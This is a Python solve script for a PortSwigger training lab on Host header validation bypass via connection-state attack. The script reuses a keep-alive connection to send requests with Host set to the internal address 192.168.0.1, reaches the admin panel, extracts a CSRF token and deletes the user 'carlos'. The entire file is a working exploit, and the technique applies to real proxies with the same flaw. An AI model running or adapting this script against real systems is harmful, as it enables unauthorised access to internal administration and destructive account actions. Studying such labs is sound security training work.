#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Host validation bypass via connection state attack.

The front-end proxy validates the Host header only on the FIRST request of a
keep-alive connection. Subsequent requests on the same connection bypass validation,
allowing access to the internal admin panel at 192.168.0.1.

NOTE: This attack requires reusing the same TCP connection for both requests.
The requests library uses HTTP/1.1 with keep-alive by default, so a single
Session object will reuse the connection automatically.

The internal admin is at 192.168.0.1.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

INTERNAL_ADMIN = "192.168.0.1"


def solve(lab, session_cookie, lab_cookie):
    s = requests.Session()
    s.verify = False

    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
    }
    cookies = {"session": session_cookie, "_lab": lab_cookie}

    # Request 1: establish trusted connection with legitimate host
    lab_host = lab.replace("https://", "").replace("http://", "").rstrip("/")
    print(f"[*] Request 1: establishing connection via {lab_host}")
    r1 = s.get(lab, headers={**base_headers, "Host": lab_host}, cookies=cookies)
    print(f"[*] Request 1: {r1.status_code}")

    # Request 2: access internal admin on same connection
    print(f"[*] Request 2: accessing internal admin at {INTERNAL_ADMIN}")
    r2 = s.get(
        f"{lab}/admin",
        headers={**base_headers, "Host": INTERNAL_ADMIN},
        cookies=cookies,
    )
    print(f"[*] Request 2: {r2.status_code}")

    if r2.status_code != 200:
        print(f"[-] Admin not accessible: {r2.status_code}")
        return

    csrf = re.search(r'name="csrf" value="([^"]+)"', r2.text)
    if not csrf:
        print("[-] CSRF token not found.")
        return
    print(f"[+] CSRF token: {csrf.group(1)}")

    # Request 3: delete carlos on same connection
    print("[*] Request 3: deleting carlos")
    r3 = s.post(
        f"{lab}/admin/delete",
        headers={**base_headers, "Host": INTERNAL_ADMIN},
        cookies=cookies,
        data={"csrf": csrf.group(1), "username": "carlos"},
    )
    if r3.status_code in (200, 302):
        print("[+] Carlos deleted — lab solved!")
    else:
        print(f"[-] Delete returned {r3.status_code}")


def main():
    parser = argparse.ArgumentParser(
        description="Solve Host Validation Bypass via Connection State Attack"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("session", help="session cookie value")
    parser.add_argument("lab_cookie", help="_lab cookie value")
    args = parser.parse_args()
    solve(args.lab_url.rstrip("/"), args.session, args.lab_cookie)


if __name__ == "__main__":
    main()
